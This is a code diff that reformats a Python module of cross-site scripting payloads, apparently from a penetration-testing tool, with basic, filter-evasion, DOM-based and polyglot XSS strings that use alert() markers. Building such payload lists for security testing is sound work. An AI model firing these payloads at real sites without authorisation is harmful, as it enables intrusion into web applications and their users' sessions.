@@ -3,6 +3,7 @@ AIPT XSS Payloads
 
 Cross-Site Scripting payloads for security testing.
 """
+
 from __future__ import annotations
 
 import html
@@ -43,7 +44,7 @@ class XSSPayloads:
         """Basic XSS payloads"""
         payloads = [
             f'<script>alert("{cls._marker}")</script>',
-            f'<script>alert(String.fromCharCode(65,73,80,84))</script>',
+            "<script>alert(String.fromCharCode(65,73,80,84))</script>",
             f'<img src=x onerror=alert("{cls._marker}")>',
             f'<svg onload=alert("{cls._marker}")>',
             f'<body onload=alert("{cls._marker}")>',
@@ -59,10 +60,27 @@ class XSSPayloads:
     def event_handlers(cls) -> Iterator[str]:
         """Event handler-based payloads"""
         handlers = [
-            "onclick", "ondblclick", "onmousedown", "onmouseup", "onmouseover",
-            "onmousemove", "onmouseout", "onkeydown", "onkeypress", "onkeyup",
-            "onfocus", "onblur", "onchange", "onsubmit", "onreset", "onselect",
-            "onerror", "onload", "onunload", "onresize", "onscroll",
+            "onclick",
+            "ondblclick",
+            "onmousedown",
+            "onmouseup",
+            "onmouseover",
+            "onmousemove",
+            "onmouseout",
+            "onkeydown",
+            "onkeypress",
+            "onkeyup",
+            "onfocus",
+            "onblur",
+            "onchange",
+            "onsubmit",
+            "onreset",
+            "onselect",
+            "onerror",
+            "onload",
+            "onunload",
+            "onresize",
+            "onscroll",
         ]
 
         for handler in handlers:
@@ -97,50 +115,39 @@ class XSSPayloads:
             # Case variations
             f'<ScRiPt>alert("{cls._marker}")</ScRiPt>',
             f'<SCRIPT>alert("{cls._marker}")</SCRIPT>',
-
             # Null bytes
             f'<scr\x00ipt>alert("{cls._marker}")</script>',
-
             # Space variations
             f'<script\t>alert("{cls._marker}")</script>',
             f'<script\n>alert("{cls._marker}")</script>',
             f'<script\r>alert("{cls._marker}")</script>',
-
             # Tag manipulation
             f'<scr<script>ipt>alert("{cls._marker}")</scr</script>ipt>',
             f'<<script>script>alert("{cls._marker}")<</script>/script>',
-
             # Using different tags
             f'<svg/onload=alert("{cls._marker}")>',
             f'<svg\tonload=alert("{cls._marker}")>',
             f'<img src=`x`onerror=alert("{cls._marker}")>',
             f'<img src="x" onerror="alert(\'{cls._marker}\')">',
-
             # JavaScript protocol
             f'javascript:alert("{cls._marker}")',
             f'java\nscript:alert("{cls._marker}")',
             f'java\tscript:alert("{cls._marker}")',
-
             # Data URI
             f'data:text/html,<script>alert("{cls._marker}")</script>',
-            f'data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=',
-
+            "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
             # Expression (IE)
-            f'<div style="x:expression(alert(\'{cls._marker}\'))">',
-
+            f"<div style=\"x:expression(alert('{cls._marker}'))\">",
             # SVG
             f'<svg><script>alert("{cls._marker}")</script></svg>',
             f'<svg><animate onbegin=alert("{cls._marker}")>',
-
             # Without quotes
-            f'<img src=x onerror=alert({cls._marker})>',
-
+            f"<img src=x onerror=alert({cls._marker})>",
             # Without parentheses
-            f'<img src=x onerror=alert`{cls._marker}`>',
-            f'<script>alert`{cls._marker}`</script>',
-
+            f"<img src=x onerror=alert`{cls._marker}`>",
+            f"<script>alert`{cls._marker}`</script>",
             # Using eval
-            f'<img src=x onerror=eval(atob("YWxlcnQoJ1hTUycp"))>',
+            '<img src=x onerror=eval(atob("YWxlcnQoJ1hTUycp"))>',
         ]
         yield from payloads
 
@@ -149,19 +156,16 @@ class XSSPayloads:
         """DOM-based XSS payloads"""
         payloads = [
             # document.write
-            f'<script>document.write("<img src=x onerror=alert(\'{cls._marker}\')>")</script>',
-
+            f"<script>document.write(\"<img src=x onerror=alert('{cls._marker}')>\")</script>",
             # innerHTML
             f'<div id="test"></div><script>document.getElementById("test").innerHTML="<img src=x onerror=alert(\'{cls._marker}\')>"</script>',
-
             # location manipulation
             f'#<script>alert("{cls._marker}")</script>',
             f'javascript:alert("{cls._marker}")//',
-
             # eval-based
             f'<script>eval("ale"+"rt(\'{cls._marker}\')")</script>',
-            f'<script>setTimeout("alert(\'{cls._marker}\')",0)</script>',
-            f'<script>setInterval("alert(\'{cls._marker}\')",1000)</script>',
+            f"<script>setTimeout(\"alert('{cls._marker}')\",0)</script>",
+            f"<script>setInterval(\"alert('{cls._marker}')\",1000)</script>",
         ]
         yield from payloads
 
@@ -183,7 +187,7 @@ class XSSPayloads:
             f'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert("{cls._marker}")//\'>',
             f'--></script><script>alert("{cls._marker}")</script>',
             f'"-alert("{cls._marker}")-"',
-            f'\'-alert("{cls._marker}")-\'',
+            f"'-alert(\"{cls._marker}\")-'",
             f'</script><script>alert("{cls._marker}")</script>',
         ]
         yield from payloads
